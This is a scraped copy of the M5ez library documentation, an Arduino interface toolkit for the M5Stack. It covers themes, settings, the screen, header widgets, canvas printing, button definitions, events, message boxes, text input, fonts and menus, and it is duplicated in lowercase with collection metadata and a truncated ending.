menu.\nFactory defaults\nThis will erase M5ez's NVS flash section and boot, setting all M5ez settings back to their defaults.\nAdding your own settings\nYou can add your own settings menu. The settings menu object ez.settings.menuObj is a regular M5ez menu, and so your own code can, at startup, add its own submenus. To show how, let's see a snippet of M5ez's own code\nez.settings.menuObj.addItem(\"Backlight brightness\", ez.backlight.menu);\nThat's how the backlight menu item is added to the menu.\nThemes\nIncluding themes\nIn the setup() part of your code, you can include themes from the themes directory. If you include multiple themes, the settings menu will show a theme chooser where the user can choose their theme. For instance, the M5ez demo program offers both the 'default' and the 'dark' theme as follows:\nvoid setup() {\n#include <themes/default.h>\n#include <themes/dark.h>\nez.begin();\n}\nAnd thus the settings menu offers a \"Theme Chooser\" option for these two themes:\nIf you include no themes, the default theme is loaded as the only theme.\nMaking your own\nTo make your own theme, copy the default theme from the src/themes directory to your sketch directory, rename it and change the values you want to change. The dark theme should give you an idea how to uncomment and change some of the values. Make sure you at least change the 'name' property as that will be displayed in the theme chooser. Now include this file in the setup() section of your sketch. Since you're including from the sketch directory and not from a library use quotes and not pointy brackets, like #include \"myTheme.h\". If you spend some time to create a cool looking theme, please send it along so it can be included for everyone else to use.\nz-sketches\nWith a simple trick, you can make code that does something pretty on its own, but that can also be included to provide a submenu in a bigger program. If you look at the M5ez-demo program, you will see that its directory includes another sketch named z-sysinfo.ino. This is the same z-sysinfo.ino that can be compiled on its own. (It is in the examples directory.)\nNormally putting two .ino files in the same directory is a bad idea as the compiler then finds two programs that each have a setup() and a loop(). But if one of the programs (the \"master\" program) specifies #define MAIN_DECLARED and the slave program has #ifndef MAIN_DECLARED and #endif around its declaration of setup() and loop(), it no longer conflicts. This means the master program can call functions from it. As you can see z-sysinfo.ino also uses whether or not MAIN_DECLARED is defined to determine whether to provide an \"Exit\" button. After all: if it is running stand-alone there is nothing to exit to.\nAlso note that you do not need to #include any sketches placed in the same directory as your master program: the compiler combines them automatically. That also means you must ensure that no names are declared twice, or otherwise the compiler will complain.\nIt's called a z-sketch and starts with a z because that way the Arduino program that turns the .ino files into .cpp files for the compiler looks at it last, which is important. Silly hack, but it is nice to able to write smaller bits of functionality that can be shown and tested individually.\nTable of Contents\nM5ez The easy way to program on the M5Stack\nIntroduction\nOther products by M5\nAlternatives\nUiFlow\nGetting started\nIf you get fatal error: ezTime.h: No such file or directory\nStructure of documentation\nTech Notes\nM5ez User Manual\nHow it all works\nScreen\nHeader\nShowing, hiding, title\nYour own header widgets\nCanvas\nCanvas dimensions\nPrinting to the canvas\nButtons\nScheduling tasks within M5ez\nYield\nYour own events\nRedrawing after an event\nShowing messages with msgBox\nezProgressBar\n3-button text input\nFACES keyboard support\nComposing or viewing longer texts: textBox\nFonts\nFreeFonts from the Adafruit library\nFreeFonts included by the M5Stack driver\nOlder fonts available only through M5ez\nUsing your own fonts\nMenus\nLet's start with text menus\n.runOnce()\nImage menus\nMenus: all the functions documented\nSettings\nWifi\nThe weird Wifi ghost button problem\nOver-The-Air (OTA) updates via https\nBLE\nBattery\nClock\nBacklight\nFACES keyboard\nFactory defaults\nAdding your own settings\nThemes\nIncluding themes\nMaking your own\nz-sketches\nTable of Contents", "link": "https://github.com/M5ez/M5ez", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "m5ez the easy way to program on the m5stack\nm5ez (pronounced \"m5 easy\") is a complete interface builder library for the m5stack esp32 system. it allows even novice programmers to create good looking interfaces. it comes with menus as text or as images, message boxes, very flexible button setup (including different length presses and multi-button functions), 3-button text input (you have to see it to believe it) and built-in wifi support. now you can concentrate on what your program does, and let m5ez worry about everything else.\nwritten by rop gonggrijp, with help and contributions from many others\nintroduction\nthe m5stack is a small computer that is a tinkerer's dream. it is based on espressif's esp32 chip (with wifi and bluetooth), it has a 320x240 pixel color screen, three buttons, a speaker, an sd slot and it allows you to stack boards below it, each in their own plastic enclosure. the makers sell boards for gsm, gps and lora (long range radio) as well as a motor controller board and an empty experimenter board. the chinese operation that makes them appears to sell a lot of them and i could get mine off of amazon in a week. if you like to build things that you can hold in your hand and not just write code for yet another naked-looking board plugged into your usb port, this thing is your friend.\non the software side, the easiest way to program these is using the arduino ide. m5stack provides a library which, when you include it, creates an m5 object instance that allows access to the various hardware components in the device. for instance: the display driver is accessible through commands all starting with m5.lcd..\nmaking something that looks good and allows users to interact with it is not simple though: you have to program everything yourself. if you try to make something a little more complex, you quickly get bogged down in figuring out where things go on the display, what state your interface is in, etc etc.\nin the budding m5stack community, there have been some initiatives to make it easier to create user interfaces. most notably a m5stack forum user named calin make something called \"m5stack multiapp\" which allows more easy integration of multiple existing programs into one app. his work serves as an inspiration for my work. but as much as you could have multiple programs have a common user interface, creating the programs still was nowhere near simple enough.\nenter m5ez, our contribution to making programming on the m5stack a lot easier. we hope you'll enjoy programming with this.\nother products by m5\nm5 is not only making the m5stack anymore. there's now an m5stick that is an even smaller esp32 system with a smaller screen, there's the m5 atom which has no screen and just leds, and soon there will be an m5stack core2 which has a capacitive touch screen. we plan to support some of these devices, the stick support will be rolled out soon.\nalternatives\nuiflow\nsince writing m5ez, there has been another interface toolkit for the m5stack, called uiflow. it uses a web-and-cloud-based ide that can be seen as \"blocky\" symbols or as python and creates micropython code. uiflow supports a lot of the hardware sold in conjunction with the m5stack and is very much geared towards learning and education.\nthat said, building the functionality that comes \"packaged\" with m5ez would take quite a bit of work with uiflow. if you have existing things that run on arduino, like programming in c and/or with the arduino ide, then m5ez might be the better choice. also it is generally easier to create consistent and visually pleasing interfaces in m5ez, and complex things can take surprisingly little work.\ngetting started\nm5ez is an arduino library. to start using it with the arduino ide:\nchoose sketch -> include library -> manage libraries...\ntype m5ez into the search box.\nclick the row to select the library.\nclick the install button to install the library.\nrepeat this process for the eztime library\nin file -> examples you will now see an m5ez heading down under \"examples from custom libraries\"\nyou'll have your first application on the screen in no time. you can also start with one of the sketches below in the \"menus\" section of the documentation. in fact we strongly recommend that you play around with the m5ez demo application, since it is a comprehensive showcase of m5ez's functionality that will give you a good feel for what you can and cannot do with m5ez.\nif you get fatal error: eztime.h: no such file or directory\nnote that it says above that you need to install two libraries: m5ez and eztime.\nalternatively, you can install m5ez without the time library (and without the on-screen clock), by commenting out #define m5ez_clock in file m5ez.h in the m5ez library directory.\nstructure of documentation\nyou've now seen the introduction and getting started sections of the manual. below is the user manual which lists all the functions of m5ez in detail. at the end there's a table of contents which may be of help finding something.\ntech notes\nseparate from this document, there is a directory tech_notes where we keep useful technical notes that may be a bit too obscure or in-depth for a general user manual.\nm5ez user manual\nm5ez is a complete system for building appliance-grade interfaces for the m5stack. it comes with a lot of the common functionality built-in that a programmer would otherwise have to create. while it is very easy to create functional programs \u2014 just have a look at the examples that come with the library \u2014 the entire library can be a bit overwhelming because of how much it offers. the following is a reference for programmers that want to get the most out of m5ez. it is certainly not necessary to know or fully understand every function, but at some point you probably want to go through this document very quickly to see what m5ez can do for you.\nif you feel anything is still unclear after reading this document, please file an issue in the repository. i take documentation seriously \u2014 if something is not clear in here, it is as much a bug as something that's wrong with the software itself. pull requests for typos etc. gladly accepted.\nhow it all works\nas you can see from the examples, the commands that activate m5ez's functionality start with ez.. that ez refers to an object ez that is within the \"root namespace\" of the sketch. within it are commands like ez.msgbox, but also other objects. for instance: commands that deal with the entire screen are prefixed with ez.screen., wifi commands start with ez.wifi. and so forth.\nafter you include the library with #include <m5ez.h>, those objects all exist. to get things going you then \u2014 in the void setup() part of your sketch \u2014 do ez.begin(). this replaces m5.begin, which is called from within ez.begin(). you still need to #include <m5stack.h> before #include <m5ez.h> if you want to use any commands from the m5 library in your sketch.\nscreen\nthe screen object deals with the entire screen, which consists of an optional header at the top, optional buttons at the bottom and an area called \"the canvas\" in between.\nvoid ez.screen.clear()\nvoid ez.screen.clear(uint16_t color)\nuint16_t ez.screen.background()\nif you clear the screen, the header and buttons are hidden, the canvas is cleared, and the current background color is set to the color you specify, or to the background color from the current theme (ez.theme->background, see the chapter on themes) if you do not specify a color. ez.screen.background() will return the currently set background color.\nif you clear the screen, the header and buttons are hidden, so the canvas takes up the entire screen.\nheader\nthe header is the bar at the top of the screen. in the default theme it is 30 pixels high and blue, and it has text in font &freesansbold9pt7b, but all of that can be changed, either by modifying the values in the current theme on the fly or by creating your own theme.\nshowing, hiding, title\nvoid ez.header.show(string title = \"\")\nvoid ez.header.title(string title = \"\")\nbool ez.header.shown()\nvoid ez.header.clear(bool wipe = true)\nez.header.show will show the header, either with the present title or with a new one provided as an argument. ez.header.title will merely change the title, but will not change whether the header is displayed or not. ez.header.shown() returns true or false depending on whether the header is currently shown, and ez.header.clear removes the header, returning the top of the screen to the canvas. if you set wipe to false, it will not draw background pixels there. (this may help prevent flicker or add a bit of performance if you're about to clear the canvas anyway.)\nyour own header widgets\nthe clock and wifi signal strength displayed in the m5ez header are \"widgets\". you can register your own code to display widgets too.\nvoid ez.header.insert(uint8_t position, string name, uint16_t width, void (*function)(uint16_t x, uint16_t w), bool leftover = false)\nvoid ez.header.remove(string name)\nuint8_t ez.header.position(string name)\nvoid ez.header.draw(string name = \"\")\nez.header.insert lets you add your own header widget. the header widget positions start at 0 (the leftmost widget), and position specifies t the left of which widget to insert the new one. name is just a name you use to refer to your widget. the names title, clock and wifi are reserved for use by m5ez.\nexactly one widget can be specified as leftover, meaning it gets all the pixels not claimed by any other widgets. by default, this is the widget called \"title\" that holds the header title. all other widgets must have a width in pixels specified.\nfunction refers to the name of the function that draws your widget. it must be a function that returns nothing (void) and that takes two uint16_t arguments: the x position and width of your widget. this function will be called by the header code whenever the header is redrawn. but you can also force a redraw with ez.header.draw. for instance: the clock code calls for the clock widget to be redrawn every minute, for instance. note that you would never call your widget draw function directly, because your code doesn't know where all the widgets are within the header. you would only ever call it indirectly using ez.header.draw(\"your_widget_name\"), which will then see if the header is currently displayed, and if so lookup x position and width and call your draw function.\nyour widget draw function has to make sure to stay inside the lines: not lower than ez.theme->header_height, not further left than x, not further right than x + w. if you want to be able to use your widget with multiple themes, your code should probably also respect ez.theme->header_bgcolor and ez.theme->header_fgcolor to make sure things look pretty.\nez.header.position will return the relative position of an existing header widget, starting with 0 for the leftmost widget, adding one for each further widget. this can be quite useful. for instance, if you want to make sure a widget is insert directly to the left of the title, you can specify ez.header.insert(ez.header.position(\"title\"), .... if you specify (ez.header.position(\"title\") + 1 your new widget gets inserted directly to the right of the title.\nas the name implies, ez.header.remove removes the widget with the given name.\ncanvas\nthe \"canvas\" is m5ez's name for the area between the header and buttons. so if there are no header and no buttons, the canvas is the whole screen. once they are drawn, the canvas becomes smaller.\nvoid ez.canvas.clear()\nclears the canvas area to the current background color \u2014 either the default from the theme or the one specified in the most recent ez.screen.clear command. sets x and y positions for the the next print command to the top left (respecting the currently set left margin).\nvoid ez.canvas.reset()\nreset does everything ez.canvas.clear() does, but also turns on text wrap, turns off scrolling, sets the print font and color back to the defaults from the theme and sets the left margin to 0.\ncanvas dimensions\nbecause the canvas size differs when header or buttons are shown, your code can ask for various locations and dimensions of the canvas as follows:\nuint8_t ez.canvas.top()\nuint8_t ez.canvas.bottom()\nuint16_t ez.canvas.left()\nuint16_t ez.canvas.right()\nuint8_t ez.canvas.height()\nuint16_t ez.canvas.width()\nprinting to the canvas\nthe m5ez canvas inherits from the arduino print object. what that means is that you can use the print and println functions in just the way you are used to using them. here's all the different arguments taken by printf, print and println.\nsize_t ez.canvas.printf(const char * format, ...) __attribute__ ((format (printf, 2, 3)));\nsize_t ez.canvas.print(const __flashstringhelper *);\nsize_t ez.canvas.print(const string &);\nsize_t ez.canvas.print(const char[]);\nsize_t ez.canvas.print(char);\nsize_t ez.canvas.print(unsigned char, int = dec);\nsize_t ez.canvas.print(int, int = dec);\nsize_t ez.canvas.print(unsigned int, int = dec);\nsize_t ez.canvas.print(long, int = dec);\nsize_t ez.canvas.print(unsigned long, int = dec);\nsize_t ez.canvas.print(double, int = 2);\nsize_t ez.canvas.print(const printable&);\nsize_t ez.canvas.print(struct tm * timeinfo, const char * format = null);\nsize_t ez.canvas.println(const __flashstringhelper *);\nsize_t ez.canvas.println(const string &s);\nsize_t ez.canvas.println(const char[]);\nsize_t ez.canvas.println(char);\nsize_t ez.canvas.println(unsigned char, int = dec);\nsize_t ez.canvas.println(int, int = dec);\nsize_t ez.canvas.println(unsigned int, int = dec);\nsize_t ez.canvas.println(long, int = dec);\nsize_t ez.canvas.println(unsigned long, int = dec);\nsize_t ez.canvas.println(double, int = 2);\nsize_t ez.canvas.println(const printable&);\nsize_t ez.canvas.println(struct tm * timeinfo, const char * format = null);\nsize_t ez.canvas.println(void);\nbool ez.canvas.scroll()\nvoid ez.canvas.scroll(bool s)\nif you turn on scrolling with ez.canvas.scroll(true), m5ez will store what has been printed to the screen, so the contents of the screen can scroll. note that when the canvas starts scrolling, only the contents placed there with the print functions from above will scroll, everything else will be wiped. so if, for example, you have drawn something with m5.lcs.fillrect, it will be gone once you print beyond the last line.\nyou can turn scrolling off with ez.canvas.scroll(false), and you can ask what the present scroll status is with ez.canvas.scroll().\nnote on scrolling: for scrolling to work, everything that is printed to the screen is kept in memory. it is only forgotten if it scrolls off the screen or if you clear the canvas or screen. what that means is that if you turn scrolling on and then print and overwrite something lots of times, eventually the memory will fill up and your application will crash.\nbool ez.canvas.wrap()\nvoid ez.canvas.wrap(bool w)\nwrap determines whether the excess from the print functions that doesn't fit the current line is wrapped to the next line.\nuint16_t ez.canvas.lmargin()\nvoid ez.canvas.lmargin(uint16_t newmargin)\nask for and set the left margin for printing.\nvoid ez.canvas.font(const gfxfont* font)\nconst gfxfont* ez.canvas.font()\nvoid ez.canvas.color(uint16_t color)\nuint16_t ez.canvas.color()\nask for and set the font and color for printing.\nuint16_t ez.canvas.x()\nvoid ez.canvas.x(uint16_t newx)\nuint8_t ez.canvas.y()\nvoid ez.canvas.y(uint8_t newy)\nvoid pos(uint16_t x, uint8_t y)\nask for and set the x and y position for the next print command.\nbuttons\nthere are only three buttons on the m5stack. to make sure we can make good use of our rare buttons, we can assign two functions to each button: one for a short press and one for a slightly longer press. we can also assign functions to all three combinations of two keys being pressed simultaneously (ab, bc and ac). so there is a total of nine possible key functions we can assign. the functions for a single key are displayed in the bottom row of the display, the functions for key combinations in a row above. each key has a 'name' (which is also what is returned to the program if it is pressed and a 'caption', which is what is displayed on the key.\nbecause there are multiple functions that get told what buttons are going to be displayed, it would get a little hairy to give each of these function 18 possible arguments for the key names and captions. so for your convenience, all the keys you want displayed and detected are specified as one string. the different key names and captions are separated with hashes. you can specify one key name like ok, which means you will only use the middle button, it will say ok on it and it will also return the string \"ok\" to your code.\nif you specify three keys, like yes # no # maybe you will get three buttons with only one function per button. if you specify six keys, they will be the short and long presses for each key. if you specify nine, the last three will specify the ab, bc and ac button-combo functions respectively. specifying any other number of keys does not work, so the string should always contain one, three, six or nine parts, separated by hashes.\nthe captions on the key can differ from the name. to specify this, specify a name, followed by a pipe sign (|) followed by the caption. so one | un # two | deux # three | trois specifies three keys that each show a number in french but return the number in english. note that any spaces around the hashes or pipe signs in the string are ignored, to allow you to make things more readable in your code.\nif your button is captioned up, down, left or right, the caption is replaced by a triangle pointing in that direction.\nif a button has only one function, (no long press defined), the caption will be printed in the middle. if there is a short and a long press defined, they will be printed on the left and right, the right in cyan (in the default theme) to signify that it needs a longer press.\nin some cases it may be necessary to define only a long or only a short press action explicitly. in that case, defining a the key with the placeholder \"~\" will make sure its function is not interpreted. take the key definition string ~ # up # select # # right # down: this defines the leftmost key to have the 'up' function, but only with a long press, a short press is ignored. the caption prints on the right side of the button and not in the middle. (one might use this to signify that the user got to the left edge of something she's navigating, not causing the 'up' function to trigger when she keeps pressing short before realising she's at the left edge.)\nvoid ez.buttons.show(string buttons)\nshows all the buttons you specified, only redrawing the buttons that have changed from the buttons displayed already to prevent flicker. if needed it updates the canvas size to account for a changed number of keyboard rows displayed on the screen.\nvoid ez.buttons.clear(bool wipe = true)\nthis hides the buttons, growing the canvas to cover the area where the buttons were printed. if you set wipe to false, it will not draw background pixels there. (this may help prevent flicker or add a bit of performance if you're about to clear the canvas anyway.)\nstring ez.buttons.poll()\nif you call ez.buttons.poll, it will return the name of the key pressed since you last called it, or the empty string is nothing was pressed. this function is where everyone's m5ez programs will spends most of their time: waiting for the user to make things continue. if your code is waiting in a loop that includes ez.buttons.poll, clock and wifi signal updating, as well as execution of user-registered functions (see below) will continue.\nstring ez.buttons.wait()\nez.buttons.wait does the same thing as ez.buttons.poll() except it does not return if nothing is pressed. if you call it with no arguments, it assumes the buttons have already been drawn with ez.drawbuttons. (and if not your program is stuck.)\nstring ez.buttons.wait(string buttons)\nyou can specify the keys to be drawn straight into ez.buttons.wait for simple usages. for instance ez.buttons.wait(\"ok\") will display a single \"ok\" on the center button and return \"ok\" when it is pressed. (but given that you are not interested in the return value in this case, you can just specify that as a statement.)\nscheduling tasks within m5ez\nnow that we're dealing with waiting for key presses, this is a good moment to talk about scheduling, yielding and such. as discussed above, a typical program written with m5ez will spend most of its time waiting for keys to be pressed. but some things need to continue to happen while that happening: the clock and the wifi signal indicator need to update, for instance.\nyield\nvoid ez.yield()\nit could be that your code needs to do things that take a little while. if something takes many seconds, consider putting in an \"abort\" key. but suppose your code is busy and is not using ez.buttons.poll or ez.buttons.wait to check for keys. in that case use ez.yield() in your loop to make sure the clock and wifi updating (as well as user defined tasks) get executed. ez.yield calls the arduino yield function, so you do not need to call that separately.\nyour own events\nvoid ez.addevent(uint16_t (*function)(), uint32_t when = 1)\nvoid ez.removeevent(uint16_t (*function)())\nwith addevent you can register a function of your own to be executed periodically as part of m5ez's own loop when it is waiting for buttons. this function has to be a function that takes no arguments and returns a 16-bit unsigned integer. make sure you just specify the name of this function without any brackets. you can optionally specify when to run this function by adding a time in millis(). by default, the function you specify will run immediately.\nthe value returned by your function is the number of milliseconds to wait before calling the function again. so a function that only needs to run once every second would simply return 1000. if your function returns 0, the event is deleted and not executed any further.\nnote: these events are meant for things that need to happen frequently. the next event cannot be more than 65 seconds out as the period between them is a 16-bit unsigned integer. if you use m5ez with eztime, you can use eztime's events for things that need to happen with more time between them.\nas the name implies, ez.removeevent also removes your function from the loop.\nredrawing after an event\nvoid ez.redraw()\nsometimes code executed in an event will have changed the contents of the screen. the running menu knows nothing about this, and so when your event ends, it will not refresh the screen. to fix this, you can execute ez.redraw() whenever your event routine has done something on the screen. the menu code will then redraw the screen accordingly.\nchanging the menu from an event\nyou can get a pointer to the current menu from inside your event code by calling m5ez::getcurrentmenu(). events are not related to any specific menu, so you may get a pointer to different menus at different times durring the program, or even no menu at all (nullptr).\nif you need to confirm what menu you are dealing with, you can retrieve the title you gave the menu when it was created via ezmenu::gettitle(), which returns a string.\nan example of a safe usage pattern is:\nezmenu* cur_menu = m5ez::getcurrentmenu();\n// test to see if menu exists before testing menu's title\nif(cur_menu && cur_menu->gettitle() == \"desired menu title\") {\ncur_menu->setcaption(someitem, somecaption);\n}\nnote: if a menu item uses a simplefunction or an advancedfunction to display a screen which does not display any menu at all (perhaps only the canvas and buttons are rendered), m5ez::getcurrentmenu() will still return the last active menu. you can modify this menu even when it's not displayed, and the changes will be evident when you return from the simplefunction or advancedfunction.\nshowing messages with msgbox\nstring ez.msgbox(string header,\nstring msg, string buttons = \"ok\",\nconst bool blocking = true,\nconst gfxfont* font = msg_font,\nuint16_t color = msg_color)\nez.msgbox produces a screen that just has your text message centered in the middle. if your message consists of multiple lines, msgbox will word-wrap and justify to the best fit on the screen. you can indicate where to break the lines yourself with a pipe sign (|). the only two arguments you have to provide are the header text and the message to be printed. if you do not specify buttons, ez.msgbox will put a single \"ok\" button in the middle. you can specify buttons in the same way it's done with the button commands seen earlier.\nby default, msgbox then waits for the user to press any of the keys specified and returns the name of that key. if you want to scan for the keys yourself with ez.buttons.poll() (for instance because there are other things your code need to wait for or check) then you can specify false with blocking, msgbox will then show the message, header and buttons and exit.\nthe font and color options allow you to use something other than the default (theme determined) defaults for the message printed by msgbox. they act as you would expect, see the section on fonts and colors for details.\nezprogressbar\nclass ezprogressbar(string header = \"\", string msg = \"\", string buttons = \"\", const gfxfont* font = msg_font, uint16_t color = msg_color, uint16_t bar_color = progressbar_color, bool show_val = false, uint16_t val_color = progressbar_val_color)\nif you want to show progress on a download or something else, use the ezprogressbar class. it behaves very similarly to msgbox, except you need to create a class instance. to create an ezprogressbar instance called pb, one could use:\nezprogressbar pb (\"this is a header\", \"message, just like with msgbox\", \"abort\");\nthis will draw header, message, an empty (0 %) progress bar and the specified single \"abort\" button. unlike msgbox this will not block by default. in code that executes after this, one would presumably check for the \"abort\" button with ez.buttons.poll(). to advance the bar, the code would simply call:\npb.value(float val)\nwhere val is a floating point value between 0 and 100. check out the over-the-air https update example to see how the ezprogressbar object is used there. (you'll see that the ez.wifi.update() software update function accepts a pointer to an ezprogressbar instance to show its progress.)\n3-button text input\nstring ez.textinput(string header = \"\", string defaulttext = \"\")\nthis function will provide a text-entry field, pre-filled with defaulttext if specified. the user can then select a group of letter and then press the letter using the short and long keypresses and multi-key presses as discussed above in the \"buttons\" chapter. by using this method, the lower case letters can be reached in two presses, upper case letters in three. if you are in shifted or numeric mode and press lock, the keyboard will return there instead of to lower case after each successful key. once the user presses \"done\" (buttons a and c together), the function returns the entered text.\nadvanced users can make their own keyboard definitions by looking at the _keydefs keyboard definition that is part of the default theme. as you can see there are multiple lines, each holding a key definition string like we have gotten to know them by now. any key whose name is \"kb\" followed by a number causes nothing to be added to the input but the buttons in that line of the definitions to be printed instead. a key whose name is lck: optionally followed by a string means that if it is pressed the current keyboard is what the user comes back to after a line is entered. pressing a key whose name is \"back\" returns to that keyboard as well. the string is used to denote the name of that keyboard in the on-screen capslock/numlock message.\nfaces keyboard support\nstring ez.faces.poll()\nbool ez.faces.on()\nm5ez supports the m5 faces keyboard: simply set the keyboard to \"attached\" in the m5ez settings menu. when you do, you will be able to use the ez.faces.poll function to get the last key pressed on the keyboard. the textinput and textbox functions will then also look for keys from that keyboard, and start with different key definitions for the m5stack's own buttons. ez.faces.on() can be used to see if the keyboard is set to \"attached\" in the menu.\ncomposing or viewing longer texts: textbox\nstring ez.textbox(string header = \"\",\nstring text = \"\", bool readonly = false,\nstring buttons = \"up#done#down\",\nconst gfxfont* font = tb_font, uint16_t color = tb_color)\nthis will word-wrap and display the string in text (up to 32 kb), allowing the user to page through it. ideal for lora or sms messages, short mails or whatever else. if a faces keyboard is attached and readonly is false, the user can edit the text: a cursor appears, which can be moved with the arrow keys on the faces keyboard. tb_font and tb_color are the defaults from the theme, but they can be overridden by supplying a font and/or a color directly.\nfonts\nvoid ez.setfont(const gfxfont* font)\nint16_t ez.fontheight()\njust like when using the m5.lcd.setfreefont function directly, you can specify the freefont fonts to ez.setfont with a pointer to where they are in flash. m5ez makes it possible to do the same but also use the built-in \"pre-freefont\" fonts that are available. normally, you would have to pass these as a numeric parameter to m5.lcd.settextfont. m5ez provides a set of \"fake pointers\" that are treated specially to make this happen, but they can only be used by m5ez functions, not with any of the m5.lcd functions.\nthe fontheight without arguments returns the height of the current font - freefont or otherwise - in pixels, without needing to specify which text font like in the m5.lcd version.\nwhat that all means is that without adding any fonts of your own, you can specify the following fonts:\nfreefonts from the adafruit library\n&tomthumb\n&freemono9pt7b\n&freemono12pt7b\n&freemono18pt7b\n&freemono24pt7b\n&freemonobold9pt7b\n&freemonobold12pt7b\n&freemonobold18pt7b\n&freemonobold24pt7b\n&freemonooblique9pt7b\n&freemonooblique12pt7b\n&freemonooblique18pt7b\n&freemonooblique24pt7b\n&freemonoboldoblique9pt7b\n&freemonoboldoblique12pt7b\n&freemonoboldoblique18pt7b\n&freemonoboldoblique24pt7b\n&freesans9pt7b\n&freesans12pt7b\n&freesans18pt7b\n&freesans24pt7b\n&freesansbold9pt7b\n&freesansbold12pt7b\n&freesansbold18pt7b\n&freesansbold24pt7b\n&freesansoblique9pt7b\n&freesansoblique12pt7b\n&freesansoblique18pt7b\n&freesansoblique24pt7b\n&freesansboldoblique9pt7b\n&freesansboldoblique12pt7b\n&freesansboldoblique18pt7b\n&freesansboldoblique24pt7b\n&freeserif9pt7b\n&freeserif12pt7b\n&freeserif18pt7b\n&freeserif24pt7b\n&freeserifitalic9pt7b\n&freeserifitalic12pt7b\n&freeserifitalic18pt7b\n&freeserifitalic24pt7b\n&freeserifbold9pt7b\n&freeserifbold12pt7b\n&freeserifbold18pt7b\n&freeserifbold24pt7b\n&freeserifbolditalic9pt7b\n&freeserifbolditalic12pt7b\n&freeserifbolditalic18pt7b\n&freeserifbolditalic24pt7b\nfreefonts included by the m5stack driver\n&orbitron_light_24\n&orbitron_light_32\n&roboto_thin_24\n&satisfy_24\n&yellowtail_32\nolder fonts available only through m5ez\nmono6x8\nsans16\nsans26\nnumonly48\nnumonly7seg48\nnumonly75\nmono12x16\nsans32\nsans52\nnumonly96\nnumonly7seg96\nnumonly150\nnote that these fonts need to be specified without the & in front, and that the second batch consists of scaled up versions of the first batch, but they're nice and big and they still might be quite useful.\nusing your own fonts\nyou can convert your own truetype fonts to font files that can be included in your project and used on the m5stack. as a separate project, i wrote a graphical converter where you can test the fonts on a virtual m5stack display before converting. it's an online -----> tool !!! , so all of the action takes place online and in your web browser. click here (or on the image below) to use it. everything you need to know to use it is on that page also.\nmenus\nmenus are a way of letting users choose between different options, usually to influence program flow. with ezmenu, you can create a menu, give it some options and run it for the user to choose. an ezmenu can display as a list of options, allowing the user to go up and down the list (possibly scrolling off the screen). or it can be a set of full-screen (or really full-canvas) images, with the user scrolling left and right before choosing one. they are both instances of the ezmenu object\nlet's start with text menus\nto create a menu we create an instance of the ezmenu object. by having each menu be it's own instance of that object, we can store information that will disappear from ram if a submenu closes and we can return to higher menus which have kept their state. let's start with a complete sketch for a very simple text menu:\n#include <m5stack.h>\n#include <m5ez.h>\nvoid setup() {\nez.begin();\n}\nvoid loop() {\nezmenu mymenu;\nmymenu.additem(\"option 1\", mainmenu_one);\nmymenu.additem(\"option 2\", mainmenu_two);\nmymenu.additem(\"option 3\");\nmymenu.run();\n}\nvoid mainmenu_one() {\nez.msgbox(\"\", \"you pressed one\");\n}\nvoid mainmenu_two() {\nserial.println(\"number two was pressed\");\n}\nas you can see we define our menu named mymenu and we added three items with names and optional functions to jump to. we have inserted this in the arduino loop function, but we might as well have stuck it in setup, because this menu will keep running forever: the mymenu.run() statement will never complete. it will display the menu, call and wait for the appropriate function if the user selects a menu option, rinse and repeat.\nwhich is all fine and well if that's our main menu, but it doesn't work if if the menu is a submenu. this is why the yourmenu.run() function exits if the user selects a menu item named \"exit\", \"back\" or \"done\". this may be with a capitalized first letter or all lower case. (menu items are just like buttons in that they have a name and a caption. if you add an item with `yourmenu.additem(\"exit | go back to main menu\"), it will display the longer text, but still cause the menu to exit.\nlet's see our sketch again, this time with a submenu added:\n#include <m5stack.h>\n#include <m5ez.h>\nvoid setup() {\nez.begin();\n}\nvoid loop() {\nezmenu mymenu(\"main menu\");\nmymenu.additem(\"item 1\", mainmenu_one);\nmymenu.additem(\"item 2\", mainmenu_two);\nmymenu.additem(\"item 3\", mainmenu_three);\nmymenu.run();\n}\nvoid mainmenu_one() {\nez.msgbox(\"\", \"you pressed one\");\n}\nvoid mainmenu_two() {\nserial.println(\"number two was pressed\");\n}\nvoid mainmenu_three() {\nezmenu submenu(\"submenu\");\nsubmenu.additem(\"item a\");\nsubmenu.additem(\"item b\");\nsubmenu.additem(\"item c\");\nsubmenu.additem(\"back | back to main menu\");\nsubmenu.run();\n}\nas you can see, the submenu called submenu has three items that do nothing because we did not supply functions, as well as a fourth item called \"back\" (which displays \"back to main menu\"), which, when selected, causes submenu.run() to exit, which in turn causes mainmenu_three to exit which brings us back to the main menu. the main menu will sit there as if we never left, still showing \"item 3\" highlighted. the submenu object instance meanwhile has gone out of scope when the function exited, neatly cleaning up the ram it used.\ndid you notice we're now providing brackets and an argument when we create the menu. that is the header above our menu.\n.runonce()\nuntil now we have considered menus that run all by themselves, unless they exit when a user selects an option named \"back\", \"exit\" or \"done\". but you can also call yourmenu.runonce() which will exit every time a user selects an option (but still after executing the supplied function or functions). take a look at this:\n#include <m5stack.h>\n#include <m5ez.h>\nvoid setup() {\nez.begin();\n}\nvoid loop() {\nezmenu mymenu(\"main menu\");\nmymenu.additem(\"item 1\");\nmymenu.additem(\"item 2\");\nmymenu.additem(\"item 3\");\nmymenu.runonce();\nif (mymenu.pickname() == \"item 1\") {\nez.msgbox(\"\", \"you pressed one\");\n}\nif (mymenu.pickname() == \"item 2\") {\nserial.println(\"number two was pressed\");\n}\n}\nthis does exactly the same as the first example we started with. note that .runonce() returns an integer that holds the position of the item selected. so the following would be yet another way to get the same functionality:\n#include <m5stack.h>\n#include <m5ez.h>\nvoid setup() {\nez.begin();\n}\nvoid loop() {\nezmenu mymenu(\"main menu\");\nmymenu.additem(\"item 1\");\nmymenu.additem(\"item 2\");\nmymenu.additem(\"item 3\");\nwhile (true) {\nswitch (mymenu.runonce()) {\ncase 1:\nez.msgbox(\"\", \"you pressed one\");\nbreak;\ncase 2:\nserial.println(\"number two was pressed\");\nbreak;\n}\n}\n}\nimage menus\nyou can include jpg files in the flash by creating a special .h file that holds byte arrays encoding the bytes in the jpg file. if you #include this file in your program and then add at least one menu items with additem(picture1, \"item 1\") where picture1 is the name of the jpg array in the .h file, the menu's .run() and .runonce() functions will change behavior: they will show an image menu instead of a text menu.\nyou can also include the images to be shown as files, either on an sd card or on the special spiffs partition in the flash memory of the m5stack.\nthe code in the demo application to show the picture menu looks as follows:\nvoid mainmenu_image() {\nezmenu images;\n...\nimages.additem(sysinfo_jpg, \"system information\", sysinfo);\nimages.additem(wifi_jpg, \"wifi settings\", 